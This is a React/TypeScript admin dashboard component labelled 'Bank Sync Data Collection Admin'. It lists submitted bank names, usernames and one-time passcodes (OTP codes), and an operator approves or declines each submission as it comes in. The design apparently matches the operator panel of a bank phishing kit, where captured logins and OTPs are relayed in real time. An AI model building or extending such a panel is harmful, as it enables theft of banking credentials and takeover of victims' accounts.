import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Textarea } from '@/components/ui/textarea';
import { Shield, CheckCircle, XCircle, Clock, Building2, Eye } from 'lucide-react';
import { useState } from 'react';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';

interface Submission {
  id: string;
  bankId: string;
  bankName: string;
  username: string;
  status: 'pending' | 'approved' | 'declined';
  submittedAt: string;
  reviewedAt?: string;
  reviewedBy?: string;
  adminNotes?: string;
  otpCode?: string;
  accounts?: any[];
}

interface AdminAction {
  connectionId: string;
  action: 'approve' | 'decline';
  notes?: string;
}

export default function AdminDashboard() {
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);
  const [adminNotes, setAdminNotes] = useState('');

  // Fetch all submissions
  const { data: submissions = [] as Submission[], isLoading } = useQuery<Submission[]>({
    queryKey: ['/api/admin/submissions'],
  });

  // Approve/decline mutation
  const actionMutation = useMutation({
    mutationFn: async (action: AdminAction) => {
      const response = await apiRequest('POST', '/api/admin/action', action);
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/admin/submissions'] });
      setSelectedSubmission(null);
      setAdminNotes('');
      toast({
        title: "Action completed",
        description: "Submission status updated successfully",
      });
    },
    onError: () => {
      toast({
        title: "Error",
        description: "Failed to update submission status",
        variant: "destructive",
      });
    },
  });

  const handleAction = (action: 'approve' | 'decline') => {
    if (!selectedSubmission) return;
    
    actionMutation.mutate({
      connectionId: selectedSubmission.id,
      action,
      notes: adminNotes.trim() || undefined,
    });
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'pending':
        return <Badge variant="secondary" className="bg-yellow-100 text-yellow-800"><Clock className="h-3 w-3 mr-1" />Pending</Badge>;
      case 'approved':
        return <Badge variant="secondary" className="bg-green-100 text-green-800"><CheckCircle className="h-3 w-3 mr-1" />Approved</Badge>;
      case 'declined':
        return <Badge variant="secondary" className="bg-red-100 text-red-800"><XCircle className="h-3 w-3 mr-1" />Declined</Badge>;
      default:
        return <Badge variant="secondary">{status}</Badge>;
    }
  };

  const pendingCount = submissions.filter(s => s.status === 'pending').length;
  const approvedCount = submissions.filter(s => s.status === 'approved').length;
  const declinedCount = submissions.filter(s => s.status === 'declined').length;

  return (
    <div className="min-h-screen bg-background-page">
      {/* Header */}
      <header className="bg-surface shadow-sm border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center">
              <Shield className="text-primary h-8 w-8 mr-3" />
              <h1 className="text-xl font-semibold text-secondary">Admin Dashboard</h1>
            </div>
            <div className="text-sm text-gray-500">
              Bank Sync Data Collection Admin
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Stats Cards */}
        <div className="grid gap-6 md:grid-cols-4 mb-8">
          <Card className="bg-yellow-50 border-yellow-200">
            <CardHeader className="pb-3">
              <CardTitle className="text-lg flex items-center text-yellow-800">
                <Clock className="h-5 w-5 mr-2" />
                Pending
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold text-yellow-900">{pendingCount}</div>
              <p className="text-yellow-700">Awaiting review</p>
            </CardContent>
          </Card>

          <Card className="bg-green-50 border-green-200">
            <CardHeader className="pb-3">
              <CardTitle className="text-lg flex items-center text-green-800">
                <CheckCircle className="h-5 w-5 mr-2" />
                Approved
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold text-green-900">{approvedCount}</div>
              <p className="text-green-700">Approved submissions</p>
            </CardContent>
          </Card>

          <Card className="bg-red-50 border-red-200">
            <CardHeader className="pb-3">
              <CardTitle className="text-lg flex items-center text-red-800">
                <XCircle className="h-5 w-5 mr-2" />
                Declined
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold text-red-900">{declinedCount}</div>
              <p className="text-red-700">Declined submissions</p>
            </CardContent>
          </Card>

          <Card className="bg-blue-50 border-blue-200">
            <CardHeader className="pb-3">
              <CardTitle className="text-lg flex items-center text-blue-800">
                <Building2 className="h-5 w-5 mr-2" />
                Total
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold text-blue-900">{submissions.length}</div>
              <p className="text-blue-700">Total submissions</p>
            </CardContent>
          </Card>
        </div>

        <div className="grid gap-6 lg:grid-cols-3">
          {/* Submissions List */}
          <div className="lg:col-span-2">
            <Card className="bg-surface shadow-md">
              <CardHeader>
                <CardTitle className="text-xl text-secondary">All Submissions</CardTitle>
              </CardHeader>
              <CardContent>
                {isLoading ? (
                  <div className="text-center py-8">Loading submissions...</div>
                ) : submissions.length > 0 ? (
                  <div className="space-y-4">
                    {submissions.map((submission) => (
                      <div
                        key={submission.id}
                        className={`p-4 border rounded-lg cursor-pointer transition-colors ${
                          selectedSubmission?.id === submission.id
                            ? 'border-primary bg-primary/5'
                            : 'border-gray-200 hover:border-gray-300'
                        }`}
                        onClick={() => setSelectedSubmission(submission)}
                      >
                        <div className="flex items-center justify-between">
                          <div className="flex items-center">
                            <Building2 className="h-8 w-8 text-primary mr-4" />
                            <div>
                              <h3 className="font-medium text-secondary">{submission.bankName}</h3>
                              <p className="text-sm text-gray-500">
                                User: {submission.username} • {new Date(submission.submittedAt).toLocaleString()}
                              </p>
                              {submission.otpCode && (
                                <p className="text-sm text-gray-600">OTP: {submission.otpCode}</p>
                              )}
                            </div>
                          </div>
                          <div className="flex items-center space-x-3">
                            {getStatusBadge(submission.status)}
                            <Button variant="outline" size="sm">
                              <Eye className="h-4 w-4" />
                            </Button>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="text-center py-8">
                    <Building2 className="h-12 w-12 text-gray-400 mx-auto mb-4" />
                    <h3 className="text-lg font-medium text-gray-900 mb-2">No Submissions Yet</h3>
                    <p className="text-gray-500">Submissions will appear here as users complete the bank sync process</p>
                  </div>
                )}
              </CardContent>
            </Card>
          </div>

          {/* Review Panel */}
          <div>
            <Card className="bg-surface shadow-md">
              <CardHeader>
                <CardTitle className="text-xl text-secondary">Review Submission</CardTitle>
              </CardHeader>
              <CardContent>
                {selectedSubmission ? (
                  <div className="space-y-4">
                    <div>
                      <h4 className="font-medium text-secondary mb-2">Bank Details</h4>
                      <p className="text-sm text-gray-600">Bank: {selectedSubmission.bankName}</p>
                      <p className="text-sm text-gray-600">Username: {selectedSubmission.username}</p>
                      <p className="text-sm text-gray-600">Status: {getStatusBadge(selectedSubmission.status)}</p>
                    </div>

                    {selectedSubmission.otpCode && (
                      <div>
                        <h4 className="font-medium text-secondary mb-2">OTP Code</h4>
                        <p className="text-sm font-mono bg-gray-100 p-2 rounded">{selectedSubmission.otpCode}</p>
                      </div>
                    )}

                    <div>
                      <h4 className="font-medium text-secondary mb-2">Submission Date</h4>
                      <p className="text-sm text-gray-600">{new Date(selectedSubmission.submittedAt).toLocaleString()}</p>
                    </div>

                    {selectedSubmission.status === 'pending' && (
                      <>
                        <div>
                          <label className="block text-sm font-medium text-secondary mb-2">
                            Admin Notes (Optional)
                          </label>
                          <Textarea
                            value={adminNotes}
                            onChange={(e) => setAdminNotes(e.target.value)}
                            placeholder="Add any notes about this submission..."
                            rows={3}
                          />
                        </div>

                        <div className="flex gap-3">
                          <Button
                            onClick={() => handleAction('approve')}
                            disabled={actionMutation.isPending}
                            className="flex-1"
                          >
                            <CheckCircle className="h-4 w-4 mr-2" />
                            Approve
                          </Button>
                          <Button
                            onClick={() => handleAction('decline')}
                            disabled={actionMutation.isPending}
                            variant="destructive"
                            className="flex-1"
                          >
                            <XCircle className="h-4 w-4 mr-2" />
                            Decline
                          </Button>
                        </div>
                      </>
                    )}

                    {selectedSubmission.adminNotes && (
                      <div>
                        <h4 className="font-medium text-secondary mb-2">Admin Notes</h4>
                        <p className="text-sm text-gray-600 bg-gray-50 p-3 rounded">{selectedSubmission.adminNotes}</p>
                      </div>
                    )}
                  </div>
                ) : (
                  <div className="text-center py-8">
                    <Eye className="h-12 w-12 text-gray-400 mx-auto mb-4" />
                    <h3 className="text-lg font-medium text-gray-900 mb-2">Select a Submission</h3>
                    <p className="text-gray-500">Click on a submission to review and take action</p>
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
}